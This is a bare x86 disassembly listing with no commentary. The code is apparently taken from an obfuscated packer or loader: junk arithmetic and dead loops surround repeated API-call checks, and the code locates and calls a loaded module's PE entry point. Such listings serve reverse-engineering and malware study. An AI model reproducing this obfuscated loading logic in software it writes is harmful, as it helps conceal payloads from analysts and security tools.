  423f25:	mov    DWORD PTR ds:0x42a27e,0xb7
  423f2f:	cmp    eax,0xffffffff
  423f32:	mov    DWORD PTR ds:0x42a29a,0x2154
  423f3c:	jne    0x423a44
  423f42:	xor    DWORD PTR ds:0x42a2ae,0x154c
  423f4c:	mov    eax,DWORD PTR [esp+0xc]
  423f50:	mov    DWORD PTR ds:0x42a26e,0x11
  423f5a:	cmp    DWORD PTR ds:0x42a26e,0x0
  423f61:	je     0x423fac
  423f67:	cmp    DWORD PTR ds:0x42a26e,0x12
  423f6e:	jge    0x423fac
  423f74:	jmp    0x423f9a
  423f79:	push   DWORD PTR [ebp-0x28]
  423f7c:	push   DWORD PTR [ebp-0x24]
  423f7f:	push   DWORD PTR [ebp-0x24]
  423f82:	push   0x7e73
  423f87:	push   DWORD PTR [ebp-0x18]
  423f8a:	push   0x85b3
  423f8f:	push   0x429247
  423f94:	call   DWORD PTR ds:0x42a3d6
  423f9a:	mov    ecx,DWORD PTR ds:0x42a26e
  423fa0:	dec    ecx
  423fa1:	mov    DWORD PTR ds:0x42a26e,ecx
  423fa7:	jmp    0x423f5a
  423fac:	mov    ecx,DWORD PTR [esp+0x10]
  423fb0:	adc    DWORD PTR ds:0x42a2ae,0x42a2d2
  423fba:	xor    eax,edi
  423fbc:	lea    eax,[eax+ecx*1+0x3272f1]
  423fc3:	push   eax
  423fc4:	and    DWORD PTR ds:0x42a2ea,0x0
  423fce:	mov    eax,ds:0x42a2ea
  423fd3:	inc    eax
  423fd4:	mov    ds:0x42a2ea,eax
  423fd9:	cmp    DWORD PTR ds:0x42a2ea,0x26
  423fe0:	jbe    0x423ffe
  423fe6:	jmp    0x423ff1
  423feb:	call   DWORD PTR ds:0x42a3da
  423ff1:	cmp    DWORD PTR ds:0x42a2ea,0x1a
  423ff8:	jb     0x423fce
  423ffe:	mov    eax,DWORD PTR [esp+0x1c]
  424002:	sbb    DWORD PTR ds:0x42a2aa,0x42a2be
  42400c:	xor    eax,edi
  42400e:	lea    eax,[ebp+eax*1+0x3272f9]
  424015:	push   eax
  424016:	mov    eax,ds:0x42941e
  42401b:	push   DWORD PTR [eax+0x1bc]
  424021:	sub    DWORD PTR ds:0x42a2ea,0x42a286
  42402b:	call   0x424cb0
  424030:	mov    eax,DWORD PTR [esp+0xc]
  424034:	mov    ecx,DWORD PTR [esp+0x10]
  424038:	and    DWORD PTR ds:0x42a2aa,0x0
  424042:	mov    edx,DWORD PTR ds:0x42a2aa
  424048:	inc    edx
  424049:	mov    DWORD PTR ds:0x42a2aa,edx
  42404f:	cmp    DWORD PTR ds:0x42a2aa,0x9
  424056:	jg     0x4240a0
  42405c:	jmp    0x424077
  424061:	push   DWORD PTR [ebp-0x10]
  424064:	push   0x1529
  424069:	push   DWORD PTR [ebp-0x28]
  42406c:	push   0x155a
  424071:	call   DWORD PTR ds:0x42a3de
  424077:	cmp    DWORD PTR ds:0x42a2aa,0x8
  42407e:	jne    0x424093
  424084:	xor    edx,edx
  424086:	or     edx,DWORD PTR ds:0x42a2aa
  42408c:	inc    edx
  42408d:	mov    DWORD PTR ds:0x42a2aa,edx
  424093:	cmp    DWORD PTR ds:0x42a2aa,0x1e
  42409a:	jb     0x424042
  4240a0:	xor    eax,edi
  4240a2:	adc    DWORD PTR ds:0x42a256,ebx
  4240a8:	lea    eax,[ecx+eax*1+0x3272f1]
  4240af:	movzx  ecx,WORD PTR ds:0x42a2a6
  4240b6:	xor    DWORD PTR ds:0x42a29e,ecx
  4240bc:	mov    ecx,DWORD PTR [esp+0xc]
  4240c0:	mov    edx,DWORD PTR [esp+0xc]
  4240c4:	adc    DWORD PTR ds:0x42a2b6,0x42a2ee
  4240ce:	xor    edx,edi
  4240d0:	xor    ecx,edi
  4240d2:	add    ecx,edx
  4240d4:	mov    edx,DWORD PTR [esp+0xc]
  4240d8:	xor    edx,edi
  4240da:	lea    ecx,[ecx+edx*1+0x9758d3]
  4240e1:	mov    DWORD PTR ds:0x42a2ea,0x175a
  4240eb:	mov    DWORD PTR [esp+0x10],eax
  4240ef:	mov    DWORD PTR ds:0x42a28e,0x2b18
  4240f9:	cmp    eax,ecx
  4240fb:	jbe    0x423e70
  424101:	or     ecx,DWORD PTR ds:0x42a286
  424107:	mov    eax,DWORD PTR [ebp+0xc]
  42410a:	mov    ds:0x4292a2,eax
  42410f:	mov    eax,DWORD PTR [ebp+0x10]
  424112:	and    DWORD PTR ds:0x42a2c2,0x0
  42411c:	jmp    0x424130
  424121:	xor    ecx,ecx
  424123:	xor    ecx,DWORD PTR ds:0x42a2c2
  424129:	inc    ecx
  42412a:	mov    DWORD PTR ds:0x42a2c2,ecx
  424130:	cmp    DWORD PTR ds:0x42a2c2,0x1b
  424137:	jae    0x42415a
  42413d:	cmp    DWORD PTR ds:0x42a2c2,0x29
  424144:	jle    0x42415a
  42414a:	jmp    0x424155
  42414f:	call   DWORD PTR ds:0x42a3e2
  424155:	jmp    0x424121
  42415a:	mov    ds:0x4294fe,eax
  42415f:	xor    ecx,eax
  424161:	mov    eax,ds:0x4292a2
  424166:	and    ecx,0x3395
  42416c:	mov    ecx,DWORD PTR [esp+0x30]
  424170:	add    DWORD PTR ds:0x42a2c2,0x886
  42417a:	sub    eax,ebx
  42417c:	adc    DWORD PTR ds:0x42a2c2,0x4089
  424186:	xor    eax,edi
  424188:	sub    DWORD PTR ds:0x42a2b6,0x2768
  424192:	mov    DWORD PTR [ecx],eax
  424194:	and    DWORD PTR ds:0x42a2aa,0x51d9
  42419e:	lea    eax,[esp+0x2c]
  4241a2:	mov    DWORD PTR [esp+0x6c],eax
  4241a6:	lea    eax,[ebp+0x4]
  4241a9:	mov    DWORD PTR [esp+0x2c],eax
  4241ad:	xor    DWORD PTR ds:0x42a2da,0x6aa
  4241b7:	lea    eax,[esp+0x78]
  4241bb:	sub    DWORD PTR ds:0x42a266,0x42a2ba
  4241c5:	push   eax
  4241c6:	push   0x429662
  4241cb:	sub    DWORD PTR ds:0x42a25e,0x6538
  4241d5:	call   DWORD PTR ds:0x42a3c6
  4241db:	mov    DWORD PTR ds:0x42a2aa,0x7d87
  4241e5:	cmp    eax,0xffffffff
  4241e8:	jne    0x423a44
  4241ee:	push   0xf
  4241f0:	lea    eax,[esp+0x44]
  4241f4:	push   eax
  4241f5:	and    DWORD PTR ds:0x42a302,0x42a2e2
  4241ff:	push   0x4296b6
  424204:	sub    DWORD PTR ds:0x42a2d2,0x1a40
  42420e:	push   0x4296ca
  424213:	adc    DWORD PTR ds:0x42a302,0xcfc
  42421d:	push   0x4296ea
  424222:	add    DWORD PTR ds:0x42a292,0x42a286
  42422c:	call   esi
  42422e:	xor    DWORD PTR ds:0x42a2aa,0x42a302
  424238:	imul   eax,eax,0x300000
  42423e:	cmp    eax,0x1b00000
  424243:	mov    DWORD PTR ds:0x42a2d6,0x3d32
  42424d:	jne    0x423a44
  424253:	lea    eax,[esp+0x1b8]
  42425a:	adc    DWORD PTR ds:0x42a29a,0x42a2c6
  424264:	push   eax
  424265:	and    DWORD PTR ds:0x42a2ea,0x7bce
  42426f:	push   0x429726
  424274:	xor    DWORD PTR ds:0x42a2d2,0x75c
  42427e:	call   DWORD PTR ds:0x42a3e6
  424284:	cmp    eax,0xffffffff
  424287:	mov    DWORD PTR ds:0x42a2d6,0x39fb
  424291:	jne    0x423a44
  424297:	sbb    DWORD PTR ds:0x42a2ea,0x7658
  4242a1:	lea    eax,[esp+0x78]
  4242a5:	push   eax
  4242a6:	push   0x429712
  4242ab:	call   DWORD PTR ds:0x42a3c6
  4242b1:	cmp    eax,0xffffffff
  4242b4:	mov    DWORD PTR ds:0x42a27a,0x74cc
  4242be:	jne    0x423a44
  4242c4:	adc    DWORD PTR ds:0x42a2be,0x42a2e2
  4242ce:	push   0xf
  4242d0:	and    DWORD PTR ds:0x42a272,0x42a2d6
  4242da:	lea    eax,[esp+0x44]
  4242de:	xor    DWORD PTR ds:0x42a2da,0x20f3
  4242e8:	push   eax
  4242e9:	sub    DWORD PTR ds:0x42a2f2,0x57ed
  4242f3:	push   0x429766
  4242f8:	push   0x42977a
  4242fd:	push   0x42979a
  424302:	sbb    DWORD PTR ds:0x42a272,0x42a302
  42430c:	call   esi
  42430e:	imul   eax,eax,0x300000
  424314:	cmp    eax,0x1b00000
  424319:	mov    DWORD PTR ds:0x42a2ea,0x7ab0
  424323:	jne    0x423a44
  424329:	and    DWORD PTR ds:0x42a2e6,0x42a29a
  424333:	lea    eax,[esp+0x1b8]
  42433a:	neg    DWORD PTR ds:0x42a26e
  424340:	push   eax
  424341:	push   0x4297d6
  424346:	xor    DWORD PTR ds:0x42a28e,0x42a2c2
  424350:	call   DWORD PTR ds:0x42a3e6
  424356:	mov    DWORD PTR ds:0x42a292,0x73e5
  424360:	cmp    eax,0xffffffff
  424363:	jne    0x423a44
  424369:	lea    eax,[esp+0x78]
  42436d:	xor    DWORD PTR ds:0x42a2ea,0x42a256
  424377:	push   eax
  424378:	and    DWORD PTR ds:0x42a28e,0x42a256
  424382:	push   0x4297c2
  424387:	sub    DWORD PTR ds:0x42a26e,0xb4e
  424391:	call   DWORD PTR ds:0x42a3c6
  424397:	mov    DWORD PTR ds:0x42a292,0x325f
  4243a1:	cmp    eax,0xffffffff
  4243a4:	mov    DWORD PTR ds:0x42a2d2,0x412a
  4243ae:	jne    0x423a44
  4243b4:	adc    DWORD PTR ds:0x42a28a,0x42a27a
  4243be:	push   0xf
  4243c0:	lea    eax,[esp+0x44]
  4243c4:	push   eax
  4243c5:	adc    DWORD PTR ds:0x42a28a,0x1e7a
  4243cf:	push   0x429816
  4243d4:	sub    DWORD PTR ds:0x42a2aa,0xfe
  4243de:	push   0x42982a
  4243e3:	sub    DWORD PTR ds:0x42a27e,0x1b5
  4243ed:	push   0x42984a
  4243f2:	adc    DWORD PTR ds:0x42a28e,0x2d72
  4243fc:	call   esi
  4243fe:	imul   eax,eax,0x300000
  424404:	cmp    eax,0x1b00000
  424409:	mov    DWORD PTR ds:0x42a28e,0x482a
  424413:	jne    0x423a44
  424419:	sub    DWORD PTR ds:0x42a25a,0x42a2ba
  424423:	lea    eax,[esp+0x1b8]
  42442a:	push   eax
  42442b:	adc    DWORD PTR ds:0x42a28e,0x42a2da
  424435:	push   0x429886
  42443a:	xor    DWORD PTR ds:0x42a26e,0x42a29a
  424444:	call   DWORD PTR ds:0x42a3e6
  42444a:	mov    DWORD PTR ds:0x42a2ca,0x1025
  424454:	cmp    eax,0xffffffff
  424457:	jne    0x423a44
  42445d:	xor    DWORD PTR ds:0x42a2c2,0x449b
  424467:	lea    eax,[esp+0x78]
  42446b:	push   eax
  42446c:	push   0x429872
  424471:	and    DWORD PTR ds:0x42a27a,0x42a2fa
  42447b:	call   DWORD PTR ds:0x42a3c6
  424481:	mov    DWORD PTR ds:0x42a2fa,0x2004
  42448b:	cmp    eax,0xffffffff
  42448e:	mov    DWORD PTR ds:0x42a296,0x62c6
  424498:	jne    0x423a44
  42449e:	and    DWORD PTR ds:0x42a2de,0x5eb4
  4244a8:	push   0xf
  4244aa:	adc    DWORD PTR ds:0x42a28a,0x4918
  4244b4:	lea    eax,[esp+0x44]
  4244b8:	or     DWORD PTR ds:0x42a2a6,0x42a25e
  4244c2:	push   eax
  4244c3:	sbb    DWORD PTR ds:0x42a2a2,0x42a262
  4244cd:	push   0x4298c6
  4244d2:	xor    DWORD PTR ds:0x42a2d2,0x1d8b
  4244dc:	push   0x4298da
  4244e1:	and    DWORD PTR ds:0x42a2b6,0x42a302
  4244eb:	push   0x4298fa
  4244f0:	not    DWORD PTR ds:0x42a2d2
  4244f6:	call   esi
  4244f8:	imul   eax,eax,0x300000
  4244fe:	cmp    eax,0x1b00000
  424503:	mov    DWORD PTR ds:0x42a292,0xbee
  42450d:	jne    0x423a44
  424513:	xor    DWORD PTR ds:0x42a266,0x42a2c6
  42451d:	lea    eax,[esp+0x1b8]
  424524:	push   eax
  424525:	or     DWORD PTR ds:0x42a2be,0x2cef
  42452f:	push   0x429936
  424534:	call   DWORD PTR ds:0x42a3e6
  42453a:	cmp    eax,0xffffffff
  42453d:	mov    DWORD PTR ds:0x42a2b6,0x6b51
  424547:	jne    0x423a44
  42454d:	sub    DWORD PTR ds:0x42a276,0x363f
  424557:	lea    eax,[esp+0x78]
  42455b:	add    DWORD PTR ds:0x42a29e,0x42a302
  424565:	push   eax
  424566:	push   0x429922
  42456b:	adc    DWORD PTR ds:0x42a27a,0x42a2c6
  424575:	call   DWORD PTR ds:0x42a3c6
  42457b:	cmp    eax,0xffffffff
  42457e:	jne    0x423a44
  424584:	or     DWORD PTR ds:0x42a292,0x4d8b
  42458e:	push   0xf
  424590:	or     DWORD PTR ds:0x42a2c6,0x42a2d2
  42459a:	lea    eax,[esp+0x44]
  42459e:	push   eax
  42459f:	adc    DWORD PTR ds:0x42a2a6,0x7f91
  4245a9:	push   0x429976
  4245ae:	and    DWORD PTR ds:0x42a28e,0x42a27e
  4245b8:	push   0x42998a
  4245bd:	push   0x4299aa
  4245c2:	call   esi
  4245c4:	or     DWORD PTR ds:0x42a2d6,0x5541
  4245ce:	imul   eax,eax,0x300000
  4245d4:	mov    DWORD PTR ds:0x42a292,0x284d
  4245de:	cmp    eax,0x1b00000
  4245e3:	mov    DWORD PTR ds:0x42a302,0x32eb
  4245ed:	jne    0x423a44
  4245f3:	adc    DWORD PTR ds:0x42a2ee,0x651e
  4245fd:	lea    eax,[esp+0x1b8]
  424604:	push   eax
  424605:	and    DWORD PTR ds:0x42a286,0x42a2f2
  42460f:	push   0x4299e6
  424614:	sub    DWORD PTR ds:0x42a2ee,0x3d63
  42461e:	call   DWORD PTR ds:0x42a3e6
  424624:	mov    DWORD PTR ds:0x42a2a2,0x1646
  42462e:	cmp    eax,0xffffffff
  424631:	jne    0x423a44
  424637:	adc    DWORD PTR ds:0x42a286,0x29d1
  424641:	lea    eax,[esp+0x78]
  424645:	push   eax
  424646:	sbb    DWORD PTR ds:0x42a25a,0x42a26e
  424650:	push   0x4299d2
  424655:	adc    DWORD PTR ds:0x42a28a,0x42a2ae
  42465f:	call   DWORD PTR ds:0x42a3c6
  424665:	cmp    eax,0xffffffff
  424668:	jne    0x423a44
  42466e:	push   0xf
  424670:	mov    DWORD PTR ds:0x42a2da,0x5dc8
  42467a:	lea    eax,[esp+0x44]
  42467e:	add    DWORD PTR ds:0x42a2a6,0x42a2b6
  424688:	push   eax
  424689:	not    DWORD PTR ds:0x42a25e
  42468f:	push   0x429a26
  424694:	push   0x429a3a
  424699:	or     DWORD PTR ds:0x42a26a,0x42a25e
  4246a3:	push   0x429a5a
  4246a8:	call   esi
  4246aa:	imul   eax,eax,0x300000
  4246b0:	cmp    eax,0x1b00000
  4246b5:	jne    0x423a44
  4246bb:	lea    eax,[esp+0x1b8]
  4246c2:	push   eax
  4246c3:	push   0x429a96
  4246c8:	xor    DWORD PTR ds:0x42a286,0x22c0
  4246d2:	call   DWORD PTR ds:0x42a3e6
  4246d8:	cmp    eax,0xffffffff
  4246db:	jne    0x423a44
  4246e1:	xor    DWORD PTR ds:0x42a2d6,0x42a2f2
  4246eb:	lea    eax,[esp+0x78]
  4246ef:	and    DWORD PTR ds:0x42a272,0x42a2da
  4246f9:	push   eax
  4246fa:	push   0x429a82
  4246ff:	dec    DWORD PTR ds:0x42a2ae
  424705:	call   DWORD PTR ds:0x42a3c6
  42470b:	mov    DWORD PTR ds:0x42a296,0x5803
  424715:	cmp    eax,0xffffffff
  424718:	mov    DWORD PTR ds:0x42a2ee,0x7cea
  424722:	jne    0x423a44
  424728:	xor    DWORD PTR ds:0x42a2c6,0x69dc
  424732:	push   0xf
  424734:	add    DWORD PTR ds:0x42a302,0x59e7
  42473e:	lea    eax,[esp+0x44]
  424742:	push   eax
  424743:	push   0x429ad6
  424748:	and    DWORD PTR ds:0x42a2fa,0x200e
  424752:	push   0x429aea
  424757:	push   0x429b0a
  42475c:	call   esi
  42475e:	imul   eax,eax,0x300000
  424764:	cmp    eax,0x1b00000
  424769:	mov    DWORD PTR ds:0x42a29e,0x5c25
  424773:	jne    0x423a44
  424779:	sbb    DWORD PTR ds:0x42a2ce,0x42a2d6
  424783:	lea    eax,[esp+0x1b8]
  42478a:	xor    DWORD PTR ds:0x42a2a2,0x42a2aa
  424794:	push   eax
  424795:	push   0x429b46
  42479a:	or     DWORD PTR ds:0x42a266,0x3d87
  4247a4:	call   DWORD PTR ds:0x42a3e6
  4247aa:	mov    DWORD PTR ds:0x42a2ca,0x3132
  4247b4:	cmp    eax,0xffffffff
  4247b7:	jne    0x423a44
  4247bd:	lea    eax,[esp+0x78]
  4247c1:	push   eax
  4247c2:	push   0x429b32
  4247c7:	call   DWORD PTR ds:0x42a3c6
  4247cd:	cmp    eax,0xffffffff
  4247d0:	jne    0x423a44
  4247d6:	push   0xf
  4247d8:	lea    eax,[esp+0x44]
  4247dc:	push   eax
  4247dd:	push   0x429b86
  4247e2:	push   0x429b9a
  4247e7:	push   0x429bba
  4247ec:	call   esi
  4247ee:	imul   eax,eax,0x300000
  4247f4:	cmp    eax,0x1b00000
  4247f9:	jne    0x423a44
  4247ff:	lea    eax,[esp+0x1b8]
  424806:	push   eax
  424807:	push   0x429bf6
  42480c:	call   DWORD PTR ds:0x42a3e6
  424812:	cmp    eax,0xffffffff
  424815:	jne    0x423a44
  42481b:	lea    eax,[esp+0x78]
  42481f:	push   eax
  424820:	push   0x429be2
  424825:	call   DWORD PTR ds:0x42a3c6
  42482b:	cmp    eax,0xffffffff
  42482e:	jne    0x423a44
  424834:	push   0xf
  424836:	lea    eax,[esp+0x44]
  42483a:	push   eax
  42483b:	push   0x429c36
  424840:	push   0x429c4a
  424845:	push   0x429c6a
  42484a:	call   esi
  42484c:	imul   eax,eax,0x300000
  424852:	cmp    eax,0x1b00000
  424857:	jne    0x423a44
  42485d:	lea    eax,[esp+0x1b8]
  424864:	push   eax
  424865:	push   0x429ca6
  42486a:	call   DWORD PTR ds:0x42a3e6
  424870:	cmp    eax,0xffffffff
  424873:	jne    0x423a44
  424879:	lea    eax,[esp+0x78]
  42487d:	push   eax
  42487e:	push   0x429c92
  424883:	call   DWORD PTR ds:0x42a3c6
  424889:	cmp    eax,0xffffffff
  42488c:	jne    0x423a44
  424892:	push   0xf
  424894:	lea    eax,[esp+0x44]
  424898:	push   eax
  424899:	push   0x429ce6
  42489e:	push   0x429cfa
  4248a3:	push   0x429d1a
  4248a8:	call   esi
  4248aa:	imul   eax,eax,0x300000
  4248b0:	cmp    eax,0x1b00000
  4248b5:	jne    0x423a44
  4248bb:	lea    eax,[esp+0x1b8]
  4248c2:	push   eax
  4248c3:	push   0x429d56
  4248c8:	call   DWORD PTR ds:0x42a3e6
  4248ce:	cmp    eax,0xffffffff
  4248d1:	jne    0x423a44
  4248d7:	lea    eax,[esp+0x78]
  4248db:	push   eax
  4248dc:	push   0x429d42
  4248e1:	call   DWORD PTR ds:0x42a3c6
  4248e7:	cmp    eax,0xffffffff
  4248ea:	jne    0x423a44
  4248f0:	push   0xf
  4248f2:	lea    eax,[esp+0x44]
  4248f6:	push   eax
  4248f7:	push   0x429d96
  4248fc:	push   0x429daa
  424901:	push   0x429dca
  424906:	call   esi
  424908:	imul   eax,eax,0x300000
  42490e:	cmp    eax,0x1b00000
  424913:	jne    0x423a44
  424919:	lea    eax,[esp+0x1b8]
  424920:	push   eax
  424921:	push   0x429e06
  424926:	call   DWORD PTR ds:0x42a3e6
  42492c:	cmp    eax,0xffffffff
  42492f:	jne    0x423a44
  424935:	lea    eax,[esp+0x78]
  424939:	push   eax
  42493a:	push   0x429df2
  42493f:	call   DWORD PTR ds:0x42a3c6
  424945:	cmp    eax,0xffffffff
  424948:	jne    0x423a44
  42494e:	push   0xf
  424950:	lea    eax,[esp+0x44]
  424954:	push   eax
  424955:	push   0x429e46
  42495a:	push   0x429e5a
  42495f:	push   0x429e7a
  424964:	call   esi
  424966:	imul   eax,eax,0x300000
  42496c:	cmp    eax,0x1b00000
  424971:	jne    0x423a44
  424977:	lea    eax,[esp+0x1b8]
  42497e:	push   eax
  42497f:	push   0x429eb6
  424984:	call   DWORD PTR ds:0x42a3e6
  42498a:	cmp    eax,0xffffffff
  42498d:	jne    0x423a44
  424993:	mov    eax,DWORD PTR [esp+0x3c]
  424997:	cmp    eax,0xf89c85ba
  42499c:	je     0x4249fb
  4249a2:	mov    eax,DWORD PTR [esp+0x20]
  4249a6:	mov    ecx,DWORD PTR [esp+0x38]
  4249aa:	xor    eax,edi
  4249ac:	add    eax,ebx
  4249ae:	cmp    eax,ecx
  4249b0:	je     0x4249fb
  4249b6:	mov    eax,ds:0x42941e
  4249bb:	mov    eax,DWORD PTR [eax+0x194]
  4249c1:	mov    ecx,DWORD PTR [eax]
  4249c3:	mov    eax,DWORD PTR [ecx+0x3c]
  4249c6:	push   DWORD PTR ds:0x4294fe
  4249cc:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4249d0:	push   DWORD PTR ds:0x4292a2
  4249d6:	add    eax,ecx
  4249d8:	mov    ecx,DWORD PTR ds:0x42941e
  4249de:	mov    ecx,DWORD PTR [ecx+0x194]
  4249e4:	push   DWORD PTR [ecx]
  4249e6:	call   eax
  4249e8:	mov    ecx,DWORD PTR ds:0x42941e
  4249ee:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4249f4:	mov    DWORD PTR [ecx],eax
  4249f6:	jmp    0x424c28
  4249fb:	mov    eax,DWORD PTR [esp+0x20]
  4249ff:	mov    ecx,DWORD PTR [esp+0x60]
  424a03:	xor    eax,edi
  424a05:	add    eax,ebx
  424a07:	cmp    eax,ecx
  424a09:	jne    0x424a72
  424a0f:	mov    eax,DWORD PTR [esp+0x20]
  424a13:	mov    ecx,DWORD PTR ds:0x42941e
  424a19:	mov    ecx,DWORD PTR [ecx+0x198]
  424a1f:	xor    eax,edi
  424a21:	add    eax,ebx
  424a23:	cmp    eax,DWORD PTR [ecx]
  424a25:	jne    0x424a4b
  424a2b:	mov    eax,DWORD PTR [esp+0x20]
  424a2f:	push   0xf89c85a5
  424a34:	xor    eax,edi
  424a36:	add    eax,ebx
  424a38:	push   eax
  424a39:	push   0xf89c85b9
  424a3e:	push   DWORD PTR [esp+0x18]
  424a42:	push   DWORD PTR [esp+0x30]
  424a46:	call   0x42332c
  424a4b:	push   DWORD PTR [esp+0xc]
  424a4f:	push   DWORD PTR [esp+0x24]
  424a53:	call   0x401000
  424a58:	mov    eax,DWORD PTR [esp+0x20]
  424a5c:	xor    eax,edi
  424a5e:	add    eax,ebx
  424a60:	mov    ds:0x4294aa,eax
  424a65:	mov    eax,DWORD PTR [esp+0x20]
  424a69:	xor    eax,edi
  424a6b:	add    eax,ebx
  424a6d:	mov    ds:0x4294a2,eax
  424a72:	mov    eax,DWORD PTR [esp+0x2c]
  424a76:	test   eax,eax
  424a78:	je     0x424c28
  424a7e:	lea    eax,[esp+0x78]
  424a82:	mov    DWORD PTR [esp+0x64],0xf152c32
  424a8a:	push   eax
  424a8b:	mov    DWORD PTR [esp+0x78],0x712ed2f
  424a93:	mov    DWORD PTR [esp+0x74],0x373fc0d
  424a9b:	push   0x429ea2
  424aa0:	mov    DWORD PTR [esp+0x70],0x72670add
  424aa8:	call   DWORD PTR ds:0x42a3c6
  424aae:	cmp    eax,0xffffffff
  424ab1:	jne    0x423a44
  424ab7:	push   0xf
  424ab9:	lea    eax,[esp+0x44]
  424abd:	push   eax
  424abe:	push   0x429ef6
  424ac3:	push   0x429f0a
  424ac8:	push   0x429f2a
  424acd:	call   esi
  424acf:	imul   eax,eax,0x300000
  424ad5:	cmp    eax,0x1b00000
  424ada:	jne    0x423a44
  424ae0:	lea    eax,[esp+0x1b8]
  424ae7:	push   eax
  424ae8:	push   0x429f66
  424aed:	call   DWORD PTR ds:0x42a3e6
  424af3:	cmp    eax,0xffffffff
  424af6:	jne    0x423a44
  424afc:	call   0x422fb1
  424b01:	mov    eax,DWORD PTR [esp+0x34]
  424b05:	mov    eax,DWORD PTR [esp+0xc]
  424b09:	mov    DWORD PTR [esp+0x30],eax
  424b0d:	mov    eax,DWORD PTR [esp+0x20]
  424b11:	mov    DWORD PTR [esp+0xc],eax
  424b15:	mov    eax,eax
  424b17:	mov    eax,ds:0x42941e
  424b1c:	mov    ecx,DWORD PTR [eax+0x1c0]
  424b22:	mov    edx,DWORD PTR [ecx]
  424b24:	and    DWORD PTR [esp+0x1c],0x0
  424b29:	mov    esi,0xfabdbed8
  424b2e:	add    edx,esi
  424b30:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424b35:	mov    ecx,0x8a29a13d
  424b3a:	xor    edx,ecx
  424b3c:	mov    DWORD PTR [esp+0x10],edx
  424b40:	mov    edx,DWORD PTR [esp+0x1c]
  424b44:	xor    edx,0x0
  424b47:	cmp    DWORD PTR [esp+0x10],0x70941fe4
  424b4f:	mov    DWORD PTR [esp+0x14],edx
  424b53:	jne    0x424b62
  424b59:	cmp    edx,0xffffffff
  424b5c:	je     0x424bcb
  424b62:	mov    eax,DWORD PTR [eax+0x1c8]
  424b68:	mov    eax,DWORD PTR [eax]
  424b6a:	cdq    
  424b6b:	add    eax,esi
  424b6d:	adc    edx,0xffffffff
  424b70:	and    DWORD PTR [esp+0x1c],0x0
  424b75:	xor    edx,0x0
  424b78:	mov    DWORD PTR [esp+0x24],edx
  424b7c:	mov    edx,DWORD PTR [esp+0xc]
  424b80:	mov    DWORD PTR [esp+0x18],edx
  424b84:	xor    eax,ecx
  424b86:	add    DWORD PTR [esp+0x18],esi
  424b8a:	mov    edx,DWORD PTR [esp+0x18]
  424b8e:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424b93:	xor    edx,ecx
  424b95:	mov    DWORD PTR [esp+0x10],edx
  424b99:	mov    edx,DWORD PTR [esp+0x1c]
  424b9d:	xor    edx,0x0
  424ba0:	mov    DWORD PTR [esp+0x14],edx
  424ba4:	cmp    DWORD PTR [esp+0x10],eax
  424ba8:	jne    0x424bba
  424bae:	mov    eax,DWORD PTR [esp+0x24]
  424bb2:	cmp    edx,eax
  424bb4:	je     0x424bcb
  424bba:	mov    eax,DWORD PTR [esp+0xc]
  424bbe:	add    eax,DWORD PTR [esp+0x30]
  424bc2:	mov    DWORD PTR [esp+0xc],eax
  424bc6:	jmp    0x424c28
  424bcb:	mov    eax,ds:0x4294a2
  424bd0:	mov    edx,DWORD PTR ds:0x4294aa
  424bd6:	xor    eax,edx
  424bd8:	mov    ds:0x4294a2,eax
  424bdd:	mov    edx,DWORD PTR ds:0x4294a2
  424be3:	mov    eax,DWORD PTR [esp+0x2c]
  424be7:	add    DWORD PTR [eax],edx
  424be9:	mov    edx,DWORD PTR [esp+0xc]
  424bed:	mov    eax,ds:0x4294a2
  424bf2:	xor    edx,edi
  424bf4:	add    edx,ebx
  424bf6:	xor    ebx,ebx
  424bf8:	add    edx,esi
  424bfa:	adc    ebx,0xffffffff
  424bfd:	xor    edi,edi
  424bff:	xor    edx,ecx
  424c01:	xor    ebx,0x0
  424c04:	add    eax,esi
  424c06:	adc    edi,0xffffffff
  424c09:	xor    eax,ecx
  424c0b:	xor    edi,0x0
  424c0e:	cmp    eax,edx
  424c10:	jne    0x424c28
  424c16:	cmp    edi,ebx
  424c18:	jne    0x424c28
  424c1e:	mov    eax,ds:0x4294a2
  424c23:	mov    ds:0x4294aa,eax
  424c28:	lea    eax,[esp+0x78]
  424c2c:	push   eax
  424c2d:	push   0x429f52
  424c32:	call   DWORD PTR ds:0x42a3c6
  424c38:	cmp    eax,0xffffffff
  424c3b:	jne    0x423a44
  424c41:	push   0xf
  424c43:	lea    eax,[esp+0x44]
  424c47:	push   eax
  424c48:	push   0x429fa6
  424c4d:	push   0x429fba
  424c52:	push   0x429fda
  424c57:	call   DWORD PTR ds:0x42a3fe
  424c5d:	imul   eax,eax,0x300000
  424c63:	cmp    eax,0x1b00000
  424c68:	jne    0x423a44
  424c6e:	lea    eax,[esp+0x1b8]
  424c75:	push   eax
  424c76:	push   0x42a006
  424c7b:	call   DWORD PTR ds:0x42a3e6
  424c81:	cmp    eax,0xffffffff
  424c84:	jne    0x423a44
  424c8a:	mov    eax,ds:0x42941e
  424c8f:	push   0x4
  424c91:	add    eax,0x1cc
  424c96:	push   eax
  424c97:	lea    eax,[esp+0x3c]
  424c9b:	push   eax
  424c9c:	call   0x424cb0
  424ca1:	mov    eax,DWORD PTR [esp+0x34]
  424ca5:	mov    eax,DWORD PTR [eax]
  424ca7:	pop    edi
  424ca8:	pop    esi
  424ca9:	pop    ebx
  424caa:	mov    esp,ebp
  424cac:	pop    ebp
  424cad:	ret    0xc
  424cb0:	push   ebp
  424cb1:	mov    ebp,esp
  424cb3:	sub    esp,0x10
  424cb6:	and    DWORD PTR ds:0x42a2ea,0x0
  424cc0:	mov    ecx,DWORD PTR ds:0x42a2ea
  424cc6:	inc    ecx
  424cc7:	mov    DWORD PTR ds:0x42a2ea,ecx
  424ccd:	cmp    DWORD PTR ds:0x42a2ea,0x8
  424cd4:	jg     0x424d20
  424cda:	jmp    0x424cf9
  424cdf:	push   0x42a27e
  424ce4:	push   0x3925
  424ce9:	push   0x42912e
  424cee:	push   0x429024
  424cf3:	call   DWORD PTR ds:0x42a3ea
  424cf9:	cmp    DWORD PTR ds:0x42a2ea,0x7
  424d00:	jne    0x424d13
  424d06:	mov    ecx,DWORD PTR ds:0x42a2ea
  424d0c:	inc    ecx
  424d0d:	mov    DWORD PTR ds:0x42a2ea,ecx
  424d13:	cmp    DWORD PTR ds:0x42a2ea,0x1f
  424d1a:	jb     0x424cc0
  424d20:	mov    eax,0xf89c85a5
  424d25:	mov    DWORD PTR [ebp-0x4],eax
